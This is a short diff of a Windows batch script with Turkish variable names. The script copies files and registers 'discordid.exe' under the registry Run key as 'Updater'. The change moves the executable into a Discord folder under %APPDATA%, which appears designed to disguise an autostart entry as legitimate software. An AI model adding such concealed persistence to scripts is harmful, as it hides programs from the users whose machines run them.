@@ -19,7 +19,7 @@ robocopy "%KAYNAK%" "%HEDEF%" /E
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" ^
 /v "Updater" ^
 /t REG_SZ ^
-/d "C:\HEDEF\discordid.exe" ^
+/d "%APPDATA%\discord\discordid.exe" ^
 /f
 
 echo Tamamlandi.
